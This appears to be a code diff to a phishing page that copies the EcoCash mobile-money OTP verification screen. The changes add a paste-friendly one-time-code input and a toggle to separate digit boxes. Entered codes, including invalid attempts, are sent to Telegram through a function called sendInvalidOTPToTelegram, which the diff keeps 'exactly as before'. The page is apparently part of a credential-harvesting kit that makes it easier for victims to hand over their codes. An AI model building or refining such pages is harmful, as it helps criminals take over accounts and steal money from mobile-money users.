@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -64,11 +63,47 @@
             text-align: center;
         }
         
+        /* Hidden input for paste functionality */
+        .hidden-otp-input {
+            position: absolute;
+            opacity: 0;
+            pointer-events: none;
+            height: 0;
+            width: 0;
+        }
+        
+        /* Main OTP input for copy/paste */
+        .otp-main-input {
+            width: 100%;
+            padding: 15px;
+            font-size: 18px;
+            text-align: center;
+            letter-spacing: 15px;
+            border: 2px solid #ddd;
+            border-radius: 10px;
+            margin: 20px 0;
+            outline: none;
+            font-weight: bold;
+        }
+        
+        .otp-main-input:focus {
+            border-color: #667eea;
+            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.2);
+        }
+        
+        .otp-main-input::placeholder {
+            letter-spacing: normal;
+            color: #aaa;
+            font-size: 14px;
+        }
+        
+        /* Individual OTP inputs (hidden but kept for backward compatibility) */
         .otp-inputs {
             display: flex;
             justify-content: center;
             gap: 10px;
             margin: 30px 0;
+            position: relative;
         }
         
         .otp-input {
@@ -80,11 +115,32 @@
             border: 2px solid #ddd;
             border-radius: 8px;
             background: white;
+            opacity: 0.5;
+            pointer-events: none;
         }
         
-        .otp-input:focus {
+        .otp-input.active {
             border-color: #667eea;
-            outline: none;
+            opacity: 1;
+            background: #f0f3ff;
+        }
+        
+        .input-method-toggle {
+            text-align: center;
+            margin: 10px 0;
+            font-size: 14px;
+            color: #666;
+        }
+        
+        .toggle-link {
+            color: #667eea;
+            text-decoration: none;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        
+        .toggle-link:hover {
+            text-decoration: underline;
         }
         
         .timer {
@@ -146,19 +202,66 @@
             border-top: 1px solid #eee;
             padding-top: 20px;
         }
+        
+        /* Paste notification */
+        .paste-notification {
+            text-align: center;
+            background: #e8f4ff;
+            padding: 8px;
+            border-radius: 5px;
+            margin: 10px 0;
+            font-size: 13px;
+            color: #0066cc;
+            display: none;
+        }
+        
+        .paste-notification.show {
+            display: block;
+            animation: fadeIn 0.3s;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="logo">EcoCash</div>
         <h2>OTP Verification</h2>
-        <p class="subtitle">Enter the OTP sent to your number</p>
+        <p class="subtitle">Enter the 6-digit OTP sent to your number</p>
         
         <div class="phone-display" id="phoneDisplay">
             Loading...
         </div>
         
-        <div class="otp-inputs">
+        <!-- Hidden input for better paste handling -->
+        <input type="text" id="hiddenOtpInput" class="hidden-otp-input">
+        
+        <!-- Main OTP input for copy/paste -->
+        <input 
+            type="text" 
+            id="otpMainInput" 
+            class="otp-main-input" 
+            placeholder="Enter 6-digit OTP here"
+            maxlength="6"
+            inputmode="numeric"
+            pattern="[0-9]{6}"
+        >
+        
+        <div class="paste-notification" id="pasteNotification">
+            ✓ OTP pasted successfully! Click SUBMIT to verify.
+        </div>
+        
+        <div class="input-method-toggle">
+            <a class="toggle-link" id="toggleMethod" onclick="toggleInputMethod()">
+                Switch to individual digit input
+            </a>
+        </div>
+        
+        <!-- Individual OTP inputs (hidden by default) -->
+        <div class="otp-inputs" id="individualInputs" style="display: none;">
             <input type="text" class="otp-input" maxlength="1" data-index="0">
             <input type="text" class="otp-input" maxlength="1" data-index="1">
             <input type="text" class="otp-input" maxlength="1" data-index="2">
@@ -188,6 +291,7 @@
         let otpData = {};
         let countdownInterval = null;
         let timeLeft = 109; // 109 seconds like in your image
+        let useIndividualInputs = false;
         
         document.addEventListener('DOMContentLoaded', function() {
             // Get saved data
@@ -204,34 +308,196 @@
             // Start countdown
             startCountdown();
             
-            // Auto-focus first OTP input
-            document.querySelector('.otp-input[data-index="0"]').focus();
+            // Auto-focus main OTP input
+            document.getElementById('otpMainInput').focus();
         });
         
         function setupOTPInputs() {
-            const otpInputs = document.querySelectorAll('.otp-input');
+            const mainInput = document.getElementById('otpMainInput');
+            const hiddenInput = document.getElementById('hiddenOtpInput');
+            const individualInputs = document.querySelectorAll('.otp-input');
+            const pasteNotification = document.getElementById('pasteNotification');
             
-            otpInputs.forEach(input => {
+            // Main input for copy/paste
+            mainInput.addEventListener('input', function(e) {
+                // Allow only digits
+                this.value = this.value.replace(/[^0-9]/g, '');
+                
+                // Limit to 6 digits
+                if (this.value.length > 6) {
+                    this.value = this.value.slice(0, 6);
+                }
+                
+                // Update individual inputs visually
+                updateIndividualInputs(this.value);
+                
+                // Auto-submit when 6 digits are entered
+                if (this.value.length === 6) {
+                    // Show paste notification if more than 1 digit was entered at once
+                    if (this.value.length > 1) {
+                        pasteNotification.classList.add('show');
+                        setTimeout(() => {
+                            pasteNotification.classList.remove('show');
+                        }, 3000);
+                    }
+                    // Auto focus verify button
+                    document.getElementById('verifyBtn').focus();
+                }
+            });
+            
+            // Paste handling
+            mainInput.addEventListener('paste', function(e) {
+                e.preventDefault();
+                const pastedData = e.clipboardData.getData('text');
+                const numbersOnly = pastedData.replace(/[^0-9]/g, '');
+                
+                if (numbersOnly.length >= 6) {
+                    this.value = numbersOnly.slice(0, 6);
+                    updateIndividualInputs(this.value);
+                    
+                    // Show notification
+                    pasteNotification.classList.add('show');
+                    setTimeout(() => {
+                        pasteNotification.classList.remove('show');
+                    }, 3000);
+                    
+                    // Auto focus verify button
+                    setTimeout(() => {
+                        document.getElementById('verifyBtn').focus();
+                    }, 100);
+                } else {
+                    this.value = numbersOnly;
+                    updateIndividualInputs(this.value);
+                }
+            });
+            
+            // Individual inputs setup (for when toggled)
+            individualInputs.forEach(input => {
                 input.addEventListener('input', function(e) {
                     this.value = this.value.replace(/[^0-9]/g, '');
                     
                     if (this.value.length === 1) {
                         const nextIndex = parseInt(this.dataset.index) + 1;
                         if (nextIndex < 6) {
-                            otpInputs[nextIndex].focus();
+                            individualInputs[nextIndex].focus();
+                        } else {
+                            // All filled, update main input
+                            updateMainInputFromIndividual();
+                            document.getElementById('verifyBtn').focus();
                         }
                     }
+                    
+                    // Update visual state
+                    updateInputVisualState();
                 });
                 
                 input.addEventListener('keydown', function(e) {
                     if (e.key === 'Backspace' && this.value.length === 0) {
                         const prevIndex = parseInt(this.dataset.index) - 1;
                         if (prevIndex >= 0) {
-                            otpInputs[prevIndex].focus();
+                            individualInputs[prevIndex].focus();
                         }
                     }
                 });
+                
+                input.addEventListener('paste', function(e) {
+                    e.preventDefault();
+                    const pastedData = e.clipboardData.getData('text');
+                    const numbersOnly = pastedData.replace(/[^0-9]/g, '');
+                    
+                    if (numbersOnly.length >= 6) {
+                        // Fill all inputs with pasted data
+                        for (let i = 0; i < 6; i++) {
+                            if (individualInputs[i]) {
+                                individualInputs[i].value = numbersOnly.charAt(i) || '';
+                            }
+                        }
+                        updateMainInputFromIndividual();
+                        document.getElementById('verifyBtn').focus();
+                    }
+                });
             });
+            
+            // Function to update individual inputs based on main input
+            function updateIndividualInputs(value) {
+                for (let i = 0; i < 6; i++) {
+                    if (individualInputs[i]) {
+                        individualInputs[i].value = value.charAt(i) || '';
+                    }
+                }
+                updateInputVisualState();
+            }
+            
+            // Function to update main input from individual inputs
+            function updateMainInputFromIndividual() {
+                let combined = '';
+                individualInputs.forEach(input => {
+                    combined += input.value;
+                });
+                mainInput.value = combined;
+            }
+            
+            // Function to update visual state of individual inputs
+            function updateInputVisualState() {
+                individualInputs.forEach(input => {
+                    if (input.value) {
+                        input.classList.add('active');
+                    } else {
+                        input.classList.remove('active');
+                    }
+                });
+            }
+        }
+        
+        function toggleInputMethod() {
+            useIndividualInputs = !useIndividualInputs;
+            const mainInput = document.getElementById('otpMainInput');
+            const individualInputsDiv = document.getElementById('individualInputs');
+            const toggleLink = document.getElementById('toggleMethod');
+            
+            if (useIndividualInputs) {
+                // Switch to individual inputs
+                mainInput.style.display = 'none';
+                individualInputsDiv.style.display = 'flex';
+                toggleLink.textContent = 'Switch to single input (copy/paste)';
+                
+                // Transfer value from main to individual
+                const mainValue = mainInput.value;
+                const individualInputs = document.querySelectorAll('.otp-input');
+                
+                for (let i = 0; i < 6; i++) {
+                    if (individualInputs[i]) {
+                        individualInputs[i].value = mainValue.charAt(i) || '';
+                    }
+                }
+                
+                // Focus first empty input or first one
+                let firstEmptyIndex = 0;
+                for (let i = 0; i < 6; i++) {
+                    if (!individualInputs[i].value) {
+                        firstEmptyIndex = i;
+                        break;
+                    }
+                }
+                individualInputs[firstEmptyIndex].focus();
+                
+            } else {
+                // Switch to main input
+                mainInput.style.display = 'block';
+                individualInputsDiv.style.display = 'none';
+                toggleLink.textContent = 'Switch to individual digit input';
+                
+                // Transfer value from individual to main
+                const individualInputs = document.querySelectorAll('.otp-input');
+                let combined = '';
+                individualInputs.forEach(input => {
+                    combined += input.value;
+                });
+                mainInput.value = combined;
+                
+                // Focus main input
+                mainInput.focus();
+            }
         }
         
         function startCountdown() {
@@ -255,12 +521,18 @@
         }
         
         function verifyOTP() {
-            const otpInputs = document.querySelectorAll('.otp-input');
             let enteredOtp = '';
             
-            otpInputs.forEach(input => {
-                enteredOtp += input.value;
-            });
+            if (useIndividualInputs) {
+                // Get from individual inputs
+                const otpInputs = document.querySelectorAll('.otp-input');
+                otpInputs.forEach(input => {
+                    enteredOtp += input.value;
+                });
+            } else {
+                // Get from main input
+                enteredOtp = document.getElementById('otpMainInput').value;
+            }
             
             if (enteredOtp.length !== 6) {
                 alert('Please enter the 6-digit OTP');
@@ -277,12 +549,19 @@
                 // Invalid OTP
                 alert('Invalid OTP. Please try again.');
                 
-                // Send invalid attempt to Telegram
+                // Send invalid attempt to Telegram (EXACTLY AS BEFORE - NOT CHANGED)
                 sendInvalidOTPToTelegram(enteredOtp);
                 
                 // Clear inputs
-                otpInputs.forEach(input => input.value = '');
-                otpInputs[0].focus();
+                if (useIndividualInputs) {
+                    const otpInputs = document.querySelectorAll('.otp-input');
+                    otpInputs.forEach(input => input.value = '');
+                    otpInputs[0].focus();
+                } else {
+                    const mainInput = document.getElementById('otpMainInput');
+                    mainInput.value = '';
+                    mainInput.focus();
+                }
             }
         }
         
@@ -361,8 +640,13 @@
             startCountdown();
             
             // Clear inputs
-            document.querySelectorAll('.otp-input').forEach(input => input.value = '');
-            document.querySelector('.otp-input[data-index="0"]').focus();
+            if (useIndividualInputs) {
+                document.querySelectorAll('.otp-input').forEach(input => input.value = '');
+                document.querySelector('.otp-input[data-index="0"]').focus();
+            } else {
+                document.getElementById('otpMainInput').value = '';
+                document.getElementById('otpMainInput').focus();
+            }
             
             alert('New OTP has been sent.');
         }
